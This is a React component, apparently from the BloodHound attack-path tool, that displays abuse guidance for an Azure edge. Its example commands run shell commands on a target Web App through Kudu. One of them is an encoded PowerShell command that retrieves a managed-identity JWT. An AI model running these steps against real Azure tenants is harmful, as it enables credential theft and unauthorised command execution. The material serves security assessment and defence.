// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Typography } from '@mui/material';

const Abuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                You can use BARK's Invoke-AzureRMWebAppShellCommand function to execute commands on a target Web App.
                You can use BARK's New-PowerShellFunctionAppFunction, Get-AzureFunctionAppMasterKeys, and
                Get-AzureFunctionOutput functions to execute arbitrary commands against a target Function App.
            </Typography>

            <Typography variant='body2'>
                These functions require you to supply an Azure Resource Manager scoped JWT associated with the principal
                that has the privilege to execute commands on the web app or function app. There are several ways to
                acquire a JWT. For example, you may use BARK's Get-ARMTokenWithRefreshToken to acquire an Azure
                RM-scoped JWT by supplying a refresh token:
            </Typography>

            <Typography component={'pre'}>
                {'$ARMToken = Get-ARMTokenWithRefreshToken `\n' +
                    '    -RefreshToken "0.ARwA6WgJJ9X2qk…" `\n' +
                    '    -TenantID "contoso.onmicrosoft.com"'}
            </Typography>

            <Typography variant='body2'>
                Now you can use BARK's Invoke-AzureRMWebAppShellCommand function to execute a command against the target
                Web App. For example, to run a simple "whoami" command:
            </Typography>

            <Typography component={'pre'}>
                {'Invoke-AzureRMWebAppShellCommand `\n' +
                    '    -KuduURI "https://mycoolwindowswebapp.scm.azurewebsites.net/api/command" `\n' +
                    '    -Token $ARMToken `\n' +
                    '    -Command "whoami"'}
            </Typography>

            <Typography variant='body2'>
                If the Web App has a managed identity assignments, you can use BARK's Invoke-AzureRMWebAppShellCommand
                function to retrieve a JWT for the managed identity Service Principal like this:
            </Typography>

            <Typography component={'pre'}>
                {'PS C:> $PowerShellCommand = ' +
                    '\n' +
                    '            $headers=@{"X-IDENTITY-HEADER"=$env:IDENTITY_HEADER}\n' +
                    '            $response = Invoke-WebRequest -UseBasicParsing -Uri "$($env:IDENTITY_ENDPOINT)?resource=https://storage.azure.com/&api-version=2019-08-01" -Headers $headers\n' +
                    '            $response.RawContent' +
                    '\n\n' +
                    'PS C:> $base64Cmd = [System.Convert]::ToBase64String(\n' +
                    '            [System.Text.Encoding]::Unicode.GetBytes(\n' +
                    '                $PowerShellCommand\n' +
                    '            )\n' +
                    '        )\n\n' +
                    'PS C:> $Command = "powershell -enc $($base64Cmd)"\n\n' +
                    'PS C:> Invoke-AzureRMWebAppShellCommand `\n' +
                    '            -KuduURI "https://mycoolwindowswebapp.scm.azurewebsites.net/api/command" `\n' +
                    '            -token $ARMToken `\n' +
                    '            -Command $Command'}
            </Typography>

            <Typography variant='body2'>
                If successful, the output will include a JWT for the managed identity service principal.
            </Typography>
        </>
    );
};

export default Abuse;
